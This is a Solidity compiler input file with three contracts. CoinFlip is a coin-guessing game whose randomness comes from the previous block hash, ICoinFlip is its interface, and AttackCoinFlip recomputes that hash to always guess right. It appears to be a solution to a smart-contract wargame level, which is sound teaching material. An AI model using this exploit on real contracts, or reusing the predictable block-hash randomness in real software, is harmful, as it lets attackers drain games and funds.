{
  "language": "Solidity",
  "sources": {
    "contracts/CoinFlip/AttackCoinFlip.sol": {
      "content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"./ICoinFlip.sol\";\n\ncontract AttackCoinFlip {\n\n    ICoinFlip coinFlip;\n    uint256 lastHash;\n    uint256 FACTOR =\n        57896044618658097711785492504343953926634992332820282019728792003956564819968;\n\n    constructor(ICoinFlip _coinFlip) {\n        coinFlip = _coinFlip;\n    }\n\n    function flip() public {\n        uint256 blockValue = uint256(blockhash(block.number - 1));\n        lastHash = blockValue;\n        uint256 cFlip = blockValue / FACTOR;\n        bool side = cFlip == 1 ? true : false;\n        coinFlip.flip(side);\n    }\n}\n"
    },
    "contracts/CoinFlip/CoinFlip.sol": {
      "content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ncontract CoinFlip {\n\n  uint256 public consecutiveWins;\n  uint256 lastHash;\n  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;\n\n  constructor() {\n    consecutiveWins = 0;\n  }\n\n  function flip(bool _guess) public returns (bool) {\n    uint256 blockValue = uint256(blockhash(block.number - 1));\n\n    if (lastHash == blockValue) {\n      revert();\n    }\n\n    lastHash = blockValue;\n    uint256 coinFlip = blockValue / FACTOR;\n    bool side = coinFlip == 1 ? true : false;\n\n    if (side == _guess) {\n      consecutiveWins++;\n      return true;\n    } else {\n      consecutiveWins = 0;\n      return false;\n    }\n  }\n}"
    },
    "contracts/CoinFlip/ICoinFlip.sol": {
      "content": "// SPDX-License-Identifier: SEE LICENSE IN LICENSE\npragma solidity ^0.8.0;\n\ninterface ICoinFlip {\n    function flip(bool _guess) external returns (bool);\n}"
    }
  },
  "settings": {
    "optimizer": {
      "enabled": true,
      "runs": 200
    },
    "outputSelection": {
      "*": {
        "*": [
          "abi",
          "evm.bytecode",
          "evm.deployedBytecode",
          "evm.methodIdentifiers",
          "metadata",
          "devdoc",
          "userdoc",
          "storageLayout",
          "evm.gasEstimates"
        ],
        "": [
          "ast"
        ]
      }
    },
    "metadata": {
      "useLiteralContent": true
    }
  }
}